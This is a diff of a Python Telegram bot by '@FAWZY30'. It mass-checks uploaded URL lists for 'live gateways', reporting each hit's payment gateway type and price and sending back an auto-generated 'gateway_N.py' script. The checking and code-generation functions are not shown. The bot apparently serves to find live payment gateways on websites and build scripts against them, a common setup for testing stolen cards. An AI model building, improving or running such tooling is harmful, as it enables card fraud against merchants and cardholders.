+━━━━━━━━━━━━━━━━━━━━
+💬 Respons: <code>{result['respons'][:200]}</code>
+━━━━━━━━━━━━━━━━━━━━
+💰 Price = <b>{price_str}</b>
+━━━━━━━━━━━━━━━━━━━━
+🏦 Gateway: <b>{result.get('gateway', 'unknown')}</b>
+━━━━━━━━━━━━━━━━━━━━
+Dev: @FAWZY30''')
+            finally:
+                if os.path.exists(file_name):
+                    os.remove(file_name)
+        else:
+            safe_edit_message(message.chat.id, ko.message_id,
+                              f"❌ <b>Dead</b>\n🔗 <code>{link}</code>\n💬 <code>{result['respons'][:200]}</code>")
+
+    except Exception as e:
+        safe_edit_message(message.chat.id, ko.message_id, f"❌ Error: {str(e)[:100]}")
+
+
+# ============================================================
+# /mass — فحص ملف
+# ============================================================
+@bot.message_handler(commands=['mass'])
+def mass_start(message):
+    with open("blockusers.txt", "r") as file:
+        blocked = file.read().splitlines()
+    if str(message.from_user.id) in blocked:
+        return
+
+    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
+    if msg:
+        bot.register_next_step_handler(msg, process_mass_file)
+
+
+@bot.message_handler(commands=['stop'])
+def stop_mass(message):
+    uid = message.from_user.id
+    if uid in processing_status:
+        processing_status[uid]['stop_flag'] = True
+        safe_send_message(message.chat.id, "🛑 Stopping...")
+    else:
+        safe_send_message(message.chat.id, "❌ No active process.")
+
 
 def process_mass_file(message):
     if not message.document:
@@ -1287,89 +1378,85 @@ def process_mass_file(message):
     try:
         file_info = safe_get_file(message.document.file_id)
         if not file_info:
-            safe_send_message(message.chat.id, "❌ Failed to get file. Please try again.")
+            safe_send_message(message.chat.id, "❌ Failed to get file.")
             return
-            
-        downloaded_file = safe_download_file(file_info.file_path)
-        if not downloaded_file:
-            safe_send_message(message.chat.id, "❌ Failed to download file. Please try again.")
+
+        downloaded = safe_download_file(file_info.file_path)
+        if not downloaded:
+            safe_send_message(message.chat.id, "❌ Failed to download file.")
             return
-            
-        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
-        links = [link.strip() for link in links if link.strip()]
+
+        links = downloaded.decode('utf-8', errors='ignore').splitlines()
+        links = [l.strip() for l in links if l.strip().startswith(('http://', 'https://'))]
 
         if not links:
-            safe_send_message(message.chat.id, "❌ File is empty.")
+            safe_send_message(message.chat.id, "❌ No valid links.")
             return
 
         total = len(links)
         user_id = message.from_user.id
         chat_id = message.chat.id
-        
+
         processing_status[user_id] = {
             'total': total, 'processed': 0, 'live': 0, 'dead': 0,
             'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
             'stop_flag': False, 'done': False, 'last_update': time.time()
         }
-        
-        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: 0\n❌ Dead: 0\n⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░\nUrl : ...\nRespons : ...\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked 0 of {total}\n🛑 /stop to stop""")
-        
+
+        status_msg = safe_send_message(chat_id, f"""📊 <b>Scanning...</b>
+━━━━━━━━━━━━━━━━━━
+📌 Total: {total}
+✅ Live: 0
+❌ Dead: 0
+⏳ Progress: 0%
+━━━━━━━━━━━━━━━━━━
+🛑 /stop to stop""")
+
         if not status_msg:
             return
 
         def update_status():
-            last_text = ""
-            last_edit_time = time.time()
-            min_edit_interval = 10
-            consecutive_errors = 0
-            
+            last_edit = 0
             while True:
-                time.sleep(10)
+                time.sleep(8)
                 try:
-                    if time.time() - last_edit_time < min_edit_interval:
-                        continue
-                    
                     with processing_status[user_id]['lock']:
-                        if processing_status[user_id].get('done', False):
+                        if processing_status[user_id].get('done'):
                             break
-                        processed = processing_status[user_id]['processed']
-                        live = processing_status[user_id]['live']
-                        dead = processing_status[user_id]['dead']
-                        current_url = processing_status[user_id]['current_url']
-                        current_respons = processing_status[user_id]['current_respons']
-                        percent = int((processed / total) * 100) if total > 0 else 0
-                        bar_length = 20
-                        filled = int((percent / 100) * bar_length)
-                        bar = '█' * filled + '░' * (bar_length - filled)
-                        text = f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:60] if current_url else '...'}</code>\nRespons : <code>{current_respons[:60] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop to stop"""
-                        
-                        if text != last_text:
+                        p = processing_status[user_id]['processed']
+                        l = processing_status[user_id]['live']
+                        d = processing_status[user_id]['dead']
+                        cu = processing_status[user_id]['current_url']
+                        cr = processing_status[user_id]['current_respons']
+                        pct = int((p / total) * 100) if total > 0 else 0
+                        bar_len = 20
+                        filled = int((pct / 100) * bar_len)
+                        bar = '█' * filled + '░' * (bar_len - filled)
+
+                        text = f"""📊 <b>Scanning...</b>
+━━━━━━━━━━━━━━━━━━
+📌 Total: {total}
+✅ Live: {l}
+❌ Dead: {d}
+⏳ Progress: {pct}% {bar}
+━━━━━━━━━━━━━━━━━━
+🔗 <code>{cu[:70] if cu else '...'}</code>
+💬 <code>{cr[:70] if cr else '...'}</code>
+━━━━━━━━━━━━━━━━━━
+⏱️ {p} / {total}
+🛑 /stop"""
+
+                        if time.time() - last_edit > 8:
                             try:
                                 bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-                                last_text = text
-                                last_edit_time = time.time()
-                                consecutive_errors = 0
+                                last_edit = time.time()
                             except Exception as e:
-                                error_str = str(e)
-                                
-                                if "502" in error_str or "Bad Gateway" in error_str:
-                                    consecutive_errors += 1
-                                    print(f"⚠️ 502 in update_status - error #{consecutive_errors}")
-                                    if consecutive_errors > 5:
-                                        time.sleep(30)
-                                    else:
-                                        time.sleep(10)
-                                        
-                                elif "429" in error_str:
-                                    wait_time = 30
-                                    try:
-                                        wait_time = int(error_str.split("retry after ")[1].split(")")[0])
-                                    except:
-                                        pass
-                                    print(f"⏳ FloodWait in update_status: {wait_time}s")
-                                    time.sleep(min(wait_time, 60))
-                                    
-                                else:
+                                err = str(e)
+                                if "429" in err:
+                                    time.sleep(30)
+                                elif "502" in err or "500" in err:
+                                    time.sleep(10)
+                                elif "message is not modified" in err.lower():
                                     pass
                 except:
                     pass
@@ -1377,104 +1464,123 @@ def process_mass_file(message):
         updater = threading.Thread(target=update_status, daemon=True)
         updater.start()
 
-        time.sleep(1)
-
         for idx, link in enumerate(links):
-            if processing_status[user_id].get('stop_flag', False):
+            if processing_status[user_id].get('stop_flag'):
                 break
-            
+
             with processing_status[user_id]['lock']:
                 processing_status[user_id]['current_url'] = link
                 processing_status[user_id]['current_respons'] = 'Checking...'
-            
+
             result = check_single_link(link)
-            
+
             with processing_status[user_id]['lock']:
                 processing_status[user_id]['processed'] += 1
-                if result and result.get('live'):
+                if result.get('live'):
                     processing_status[user_id]['live'] += 1
                     live_idx = processing_status[user_id]['live']
                     processing_status[user_id]['current_respons'] = result['respons']
-                    
+
                     try:
-                        code = generate_gateway_code(result['respons'], result['link'])
                         file_name = f'gateway_{live_idx}.py'
                         with open(file_name, 'w', encoding='utf-8') as f:
-                            f.write(code)
-                        
-                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
-                        
+                            f.write(generate_gateway_code(result['respons'], result['link'], result))
+
+                        price_str = f"${result.get('amount')}" if result.get('amount') else "N/A"
+
+                        safe_send_document(chat_id, file_name,
+                            caption=f"""✅ <b>Live Gateway #{live_idx}</b>
+━━━━━━━━━━━━━━━━━━━━
+🔗 Link: <code>{result['link']}</code>
+━━━━━━━━━━━━━━━━━━━━
+💬 Respons: <code>{result['respons'][:200]}</code>
+━━━━━━━━━━━━━━━━━━━━
+💰 Price = <b>{price_str}</b>
+━━━━━━━━━━━━━━━━━━━━
+🏦 Gateway: <b>{result.get('gateway', 'unknown')}</b>
+━━━━━━━━━━━━━━━━━━━━
+Dev: @FAWZY30""")
                         try:
                             os.remove(file_name)
                         except:
                             pass
                     except Exception as e:
-                        print(f"Error sending file: {e}")
+                        print(f"send file err: {e}")
                 else:
                     processing_status[user_id]['dead'] += 1
-                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
-            
-            if idx % 5 == 0:
-                time.sleep(1)
-            
-            if idx % 50 == 0 and idx > 0:
+                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead')
+
+            if idx % 20 == 0:
                 gc.collect()
-                print(f"✅ GC collected - Processed {idx} links")
-        
+            if idx % 3 == 0:
+                time.sleep(0.5)
+
         with processing_status[user_id]['lock']:
             processing_status[user_id]['done'] = True
-            processed = processing_status[user_id]['processed']
             live = processing_status[user_id]['live']
             dead = processing_status[user_id]['dead']
-        
-        updater.join(timeout=5)
-        
-        final_text = f"""📊 <b>✅ Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30"""
-        
-        try:
-            safe_edit_message(chat_id, status_msg.message_id, final_text)
-        except:
-            safe_send_message(chat_id, final_text)
-        
-        if user_id in processing_status:
-            del processing_status[user_id]
-            
-    except Exception as e:
-        print(f"❌ Error in process_mass_file: {e}")
-        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")
-        if 'user_id' in locals() and user_id in processing_status:
-            del processing_status[user_id]
 
+        updater.join(timeout=3)
+
+        final = f"""📊 <b>✅ Complete!</b>
+━━━━━━━━━━━━━━━━━━
+📌 Total: {total}
+✅ Live: {live}
+❌ Dead: {dead}
+💯 Rate: {int((live / total) * 100) if total > 0 else 0}%
+━━━━━━━━━━━━━━━━━━
+Dev: @FAWZY30"""
+
+        try:
+            safe_edit_message(chat_id, status_msg.message_id, final)
+        except:
+            safe_send_message(chat_id, final)
+
+        processing_status.pop(user_id, None)
+
+    except Exception as e:
+        print(f"mass error: {e}")
+        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")
+        if 'user_id' in locals():
+            processing_status.pop(user_id, None)
+
+
+# ============================================================
+# Block / Unblock
+# ============================================================
 @bot.message_handler(commands=['block2'])
 def block_user(message):
     if str(message.from_user.id) not in admins:
-        safe_send_message(message.chat.id, "You do not have permission.")
         return
     try:
-        user_id_to_block = message.text.split()[1]
-        with open('blockusers.txt', 'a') as file:
-            file.write(f"{user_id_to_block}\n")
-        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_block} blocked.")
+        uid = message.text.split()[1]
+        with open('blockusers.txt', 'a') as f:
+            f.write(f"{uid}\n")
+        safe_send_message(message.chat.id, f"✅ Blocked {uid}")
     except:
         safe_send_message(message.chat.id, "Usage: /block2 [user_id]")
+
 
 @bot.message_handler(commands=['unblock2'])
 def unblock_user(message):
     if str(message.from_user.id) not in admins:
-        safe_send_message(message.chat.id, "You do not have permission.")
         return
     try:
-        user_id_to_unblock = message.text.split()[1]
-        with open('blockusers.txt', 'r') as file:
-            lines = file.readlines()
-        with open('blockusers.txt', 'w') as file:
+        uid = message.text.split()[1]
+        with open('blockusers.txt') as f:
+            lines = f.readlines()
+        with open('blockusers.txt', 'w') as f:
             for line in lines:
-                if line.strip() != user_id_to_unblock:
-                    file.write(line)
-        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_unblock} unblocked.")
+                if line.strip() != uid:
+                    f.write(line)
+        safe_send_message(message.chat.id, f"✅ Unblocked {uid}")
     except:
         safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")
 
+
+# ============================================================
+# تشغيل
+# ============================================================
 print('✅ Bot is running...')
 
 if __name__ == '__main__':
@@ -1482,44 +1588,14 @@ if __name__ == '__main__':
         try:
             print("🔄 Starting bot polling...")
             bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
-            
         except KeyboardInterrupt:
-            print('🛑 Bot stopped by user')
-            break            
+            print('🛑 Bot stopped')
+            break
         except Exception as e:
-            error_str = str(e)
-            
-            if "502" in error_str or "Bad Gateway" in error_str:
-                print(f'⚠️ 502 Bad Gateway - Telegram server issue. Waiting 10s...')
+            err = str(e)
+            if "502" in err or "409" in err or "429" in err or "500" in err:
                 time.sleep(10)
-                continue
-                
-            elif "409" in error_str:
-                print(f'⚠️ 409 Conflict - Another instance running. Waiting 15s...')
-                time.sleep(15)
-                continue
-                
-            elif "429" in error_str:
-                print(f'⚠️ 429 Too Many Requests. Waiting 30s...')
-                time.sleep(30)
-                continue
-                
-            elif "ReadTimeout" in error_str or "timeout" in error_str.lower():
-                print(f'⚠️ Timeout. Retrying in 5s...')
+            elif "timeout" in err.lower() or "Connection" in err:
                 time.sleep(5)
-                continue
-                
-            elif "Connection" in error_str or "ConnectionError" in error_str:
-                print(f'⚠️ Connection error. Retrying in 5s...')
-                time.sleep(5)
-                continue
-                
-            elif "500" in error_str or "Internal Server Error" in error_str:
-                print(f'⚠️ 500 Internal Server Error. Retrying in 10s...')
-                time.sleep(10)
-                continue
-                
             else:
-                print(f'❌ Unexpected error: {error_str[:200]}')
                 time.sleep(5)
-                continue
